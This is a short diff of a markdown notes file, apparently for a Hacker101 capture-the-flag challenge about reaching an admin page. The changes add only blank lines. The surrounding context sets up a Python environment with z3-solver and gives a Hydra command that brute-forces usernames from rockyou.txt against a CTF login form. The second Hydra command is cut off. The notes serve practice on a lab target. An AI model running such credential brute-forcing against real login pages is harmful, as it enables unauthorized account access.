@@ -8,6 +8,7 @@ For an example , there is an CTF challenge , they ask us to access the admin pag
 Which **you cannot directly access from outside**
 
 ## Use a Python virtual environment (RECOMMENDED)
+
 Step 1: Install venv if not already available
 sudo apt install python3-venv
 
@@ -21,6 +22,7 @@ source z3env/bin/activate
 pip install z3-solver
 
  **USING HYDRA :**
+ 
  hydra -L rockyou.txt -p aaa 8a72168489f6b7dbbb836097ef336c83.ctf.hacker101.com https-post-form "/login:username=^USER^&password=^PASS^:Invalid username" (or)
 
  hydra -L rockyou.txt \
